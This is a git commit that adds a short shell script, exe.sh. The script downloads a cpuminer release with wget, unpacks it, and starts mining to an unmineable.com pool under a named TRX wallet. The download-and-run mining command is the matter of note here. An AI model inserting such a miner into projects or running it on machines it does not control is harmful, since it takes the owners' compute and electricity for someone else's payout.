1c51caa78851e5585e3a718a6c9e46af267ad5a2
red56565 <108178533+red56565@users.noreply.github.com>
2023-04-09 10:41:32 +0200

    Create exe.sh

---
+++ exe.sh
@@ -0,0 +1,3 @@
+wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz 
+tar xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
+./minerd -o stratum+tcp://scrypt.unmineable.com:3333 -u TRX:THDXuAcLiSadqs6WSN1NKJymYcdy79RWuX.lycin -p x
